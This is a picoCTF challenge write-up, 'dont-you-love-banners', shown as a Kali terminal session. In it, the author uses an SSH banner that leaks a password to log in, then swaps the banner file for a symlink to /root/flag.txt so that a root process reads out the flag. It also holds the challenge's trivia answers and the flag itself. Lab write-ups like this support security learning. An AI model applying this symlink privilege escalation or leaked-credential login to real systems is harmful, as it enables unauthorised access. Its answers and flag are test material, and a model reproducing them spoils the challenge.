# dont-you-love-banners
Can you abuse the banner? The server has been leaking some crucial information on `tethys.picoctf.net 53698`. Use the leaked information to get to the server. To connect to the running application use `nc tethys.picoctf.net 62049`. From the above information abuse the machine and find the flag in the /root directory.
Do you know about symlinks?
Maybe some small password cracking or guessing

## Solución
Con la terminal de kali linux
```
──(kali㉿kali)-[~/Documents/srss/GeneralSkills]
└─$ nc tethys.picoctf.net 53698
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
^C
┌──(kali㉿kali)-[~/Documents/srss/GeneralSkills]
└─$ nc tethys.picoctf.net 62049
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
defcon
the first hacker ever was known for phreaking(making free phone calls), who was it?
john draper
player@challenge:~$ ls -la
ls -la
total 20
drwxr-xr-x 1 player player   20 Mar  9  2024 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7  2024 banner
-rw-r--r-- 1 root   root     13 Feb  7  2024 text
player@challenge:~$ cat banner  
cat banner
*************************************
**************WELCOME****************
*************************************
player@challenge:~$ cat text
cat text
keep digging
player@challenge:~$ ls -la /root
ls -la /root
total 16
drwxr-xr-x 1 root root    6 Mar  9  2024 .
drwxr-xr-x 1 root root   29 Apr 11 23:10 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar  9  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
player@challenge:~$ cat /root/flag.txt
cat /root/flag.txt
cat: /root/flag.txt: Permission denied
player@challenge:~$ sudo cat /root/flag.txt
sudo cat /root/flag.txt
-su: sudo: command not found
player@challenge:~$ rm /home/player/banner
rm /home/player/banner
player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner
player@challenge:~$ ^C
                                                                                                                                                                      
┌──(kali㉿kali)-[~/Documents/srss/GeneralSkills]
└─$ nc tethys.picoctf.net 62049
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_68ca8b23}

what is the password? 

```